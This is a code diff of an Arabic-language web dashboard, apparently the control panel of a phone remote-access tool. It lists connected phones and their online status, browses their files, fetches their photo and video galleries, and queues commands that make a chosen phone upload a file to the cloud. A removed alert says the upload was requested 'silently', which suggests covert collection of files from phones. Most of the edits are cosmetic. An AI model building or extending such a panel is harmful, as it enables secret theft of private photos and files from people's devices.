@@ -22,12 +22,10 @@
             </div>
             
             <div class="flex items-center gap-3">
-                <!-- 📱 قائمة اختيار الأجهزة -->
                 <select id="deviceSelector" onchange="changeDevice()" class="bg-slate-900 border border-slate-700 text-slate-200 text-sm rounded-lg px-3 py-2 font-bold focus:outline-none focus:border-cyan-500 shadow cursor-pointer">
                     <option value="">جاري تحميل الأجهزة...</option>
                 </select>
 
-                <!-- 🟢 مؤشر حالة اتصال الجهاز المحدد -->
                 <div id="deviceStatusIndicator" class="text-xs px-3 py-2 rounded-lg bg-slate-900 border border-slate-700 text-slate-400 font-bold shadow">
                     جاري التحقق...
                 </div>
@@ -57,13 +55,12 @@
             </div>
         </div>
 
-        <!-- 🖼️ قسم معرض صور الهاتف المختار -->
+        <!-- 🖼️ قسم معرض وسائط الهاتف المختار -->
         <div class="bg-slate-800 p-6 rounded-xl border border-slate-700 shadow-lg mb-8">
             <div class="flex flex-col md:flex-row justify-between items-start md:items-center mb-4 gap-4">
                 <h2 class="text-lg font-semibold text-purple-400">🖼️ معرض وسائط الهاتف المختار</h2>
                 
                 <div class="flex items-center gap-3">
-                    <!-- 🔴 تحديد عدد الوسائط في الصفحة (القائمة المنسدلة التي كانت مفقودة) -->
                     <div class="flex items-center gap-2">
                         <label class="text-xs text-slate-400">العدد/صفحة:</label>
                         <select id="pageSizeSelector" class="bg-slate-900 border border-slate-700 text-slate-200 text-xs rounded px-2 py-1.5 focus:outline-none focus:border-purple-500">
@@ -145,8 +142,6 @@
         let currentFilter = 'all'; 
         let currentImagePage = 1;
 
-        // 🟢 جلب وعرض الأجهزة في القائمة المنسدلة
-        // 🟢 جلب وعرض الأجهزة في القائمة المنسدلة
         async function loadDevicesAndStatus() {
             try {
                 const { data, error } = await supabaseClient.from('device_status').select('*').order('last_seen', { ascending: false });
@@ -157,13 +152,11 @@
                     const statusEl = document.getElementById('deviceStatusIndicator');
                     
                     selector.innerHTML = ''; 
-                    
                     let isCurrentActiveStillFound = false;
 
                     data.forEach(device => {
                         const diffSeconds = Math.abs(Date.now() - device.last_seen) / 1000;
-                        // 🔴 زيادة السماحية لـ 10 دقائق (600 ثانية) لتفادي اختلاف التوقيت
-                        const isOnline = diffSeconds <= 600; 
+                        const isOnline = diffSeconds <= 600;
                         const statusIcon = isOnline ? '🟢' : '🔴';
                         const shortId = device.device_id.substring(0, 6) + '...';
                         
@@ -184,7 +177,7 @@
                     const selectedDeviceData = allDevices.find(d => d.device_id === activeDeviceId);
                     if (selectedDeviceData) {
                         const diffSeconds = Math.abs(Date.now() - selectedDeviceData.last_seen) / 1000;
-                        if (diffSeconds <= 600) { // 🔴 التعديل هنا أيضاً
+                        if (diffSeconds <= 600) {
                             statusEl.innerHTML = `🟢 متصل`;
                             statusEl.className = "text-xs px-3 py-2 rounded-lg bg-slate-900 border border-emerald-500 text-emerald-400 font-bold shadow";
                         } else {
@@ -197,11 +190,11 @@
                 console.error(e);
             }
         }
-        
+
         function changeDevice() {
             activeDeviceId = document.getElementById('deviceSelector').value;
-            loadDevicesAndStatus(); // تحديث الألوان
-            fetchDirectory(""); // تصفير وتحديث الملفات للجهاز الجديد
+            loadDevicesAndStatus(); 
+            fetchDirectory(""); 
             document.getElementById('galleryGrid').innerHTML = '<div class="col-span-full text-center py-6 text-slate-500 text-sm">تم تغيير الجهاز، اضغط جلب الوسائط للعرض.</div>';
         }
 
@@ -226,7 +219,6 @@
 
         async function loadFilesFromCache() {
             if (!activeDeviceId) return;
-            // 🔴 جلب ملفات الجهاز المختار فقط
             const { data, error } = await supabaseClient.from('device_files_cache')
                 .select('*')
                 .eq('device_id', activeDeviceId);
@@ -305,12 +297,9 @@
             });
         }
 
-        // 🖼️ جلب الوسائط مع قراءة العدد من القائمة والانتظار دقيقة كاملة
         async function requestFetchImages(page) {
             if (!activeDeviceId) return;
             currentImagePage = page;
-            
-            // قراءة العدد من الـ Dropdown
             const selectedPageSize = parseInt(document.getElementById('pageSizeSelector').value) || 10;
             
             document.getElementById('galleryPageIndicator').innerText = `الصفحة ${currentImagePage}`;
@@ -320,7 +309,6 @@
                 { device_id: activeDeviceId, action: 'fetch_images', page: currentImagePage, page_size: selectedPageSize }
             ]);
 
-            // 🔴 المهلة أصبحت 60000 مللي ثانية (دقيقة كاملة)
             setTimeout(loadGalleryFromCache, 60000);
         }
 
@@ -328,7 +316,7 @@
             if (!activeDeviceId) return;
             const { data, error } = await supabaseClient.from('device_gallery_cache')
                 .select('*')
-                .eq('device_id', activeDeviceId); // 🔴 جلب صور الجهاز المختار فقط
+                .eq('device_id', activeDeviceId);
 
             const grid = document.getElementById('galleryGrid');
             grid.innerHTML = '';
@@ -340,16 +328,21 @@
 
             data.forEach(item => {
                 const card = document.createElement('div');
-                card.className = "bg-slate-900 p-2 rounded-lg border border-slate-700 text-center flex flex-col justify-between shadow";
+                card.className = "bg-slate-900 p-3 rounded-xl border border-slate-700 text-center flex flex-col justify-between shadow hover:border-purple-500 transition";
                 
-                // تحديد نوع الملف (صورة أم فيديو) للعرض
-                const isVideo = item.file_name.toLowerCase().endsWith('.mp4') || item.file_name.toLowerCase().endsWith('.mkv');
-                const icon = isVideo ? '🎬' : '📷';
+                const isVideo = item.file_name.toLowerCase().endsWith('.mp4') || item.file_name.toLowerCase().endsWith('.mkv') || item.file_name.toLowerCase().endsWith('.mov');
+                const badgeColor = isVideo ? 'bg-amber-500/20 text-amber-400 border-amber-500/30' : 'bg-purple-500/20 text-purple-400 border-purple-500/30';
+                const badgeText = isVideo ? '🎬 فيديو' : '📷 صورة';
 
                 card.innerHTML = `
-                    <div class="w-full h-24 bg-slate-800 flex items-center justify-center rounded mb-2 text-xs text-slate-400 border border-slate-700">${icon} معاينة</div>
-                    <p class="text-xs text-slate-200 truncate mb-2" title="${item.file_name}">${item.file_name}</p>
-                    <button onclick="quickUpload('${item.file_path}')" class="bg-emerald-600 hover:bg-emerald-500 text-white py-1 px-2 rounded text-xs transition">رفع للسحابة ⬆️</button>
+                    <div class="w-full h-28 bg-slate-800 flex flex-col items-center justify-center rounded-lg mb-2 border ${badgeColor}">
+                        <span class="text-2xl mb-1">${isVideo ? '🎬' : '🖼️'}</span>
+                        <span class="text-[10px] px-2 py-0.5 rounded-full font-bold ${badgeColor}">${badgeText}</span>
+                    </div>
+                    <p class="text-xs text-slate-200 truncate mb-3 font-medium" title="${item.file_name}">${item.file_name}</p>
+                    <button onclick="quickUpload('${item.file_path}')" class="w-full bg-emerald-600 hover:bg-emerald-500 text-white py-1.5 px-3 rounded-lg text-xs font-bold transition shadow">
+                        رفع للسحابة ⬆️
+                    </button>
                 `;
                 grid.appendChild(card);
             });
@@ -422,9 +415,9 @@
         async function quickUpload(filePath) {
             if (!activeDeviceId) return;
             await supabaseClient.from('device_commands').insert([
-                { device_id: activeDeviceId, action: 'upload', file_name: filePath, file_path: currentPath }
+                { device_id: activeDeviceId, action: 'upload', file_name: filePath, file_path: "" }
             ]);
-            alert(`تم طلب الرفع بصمت.`);
+            alert(`تم طلب الرفع للسحابة.`);
         }
 
         window.onload = () => {
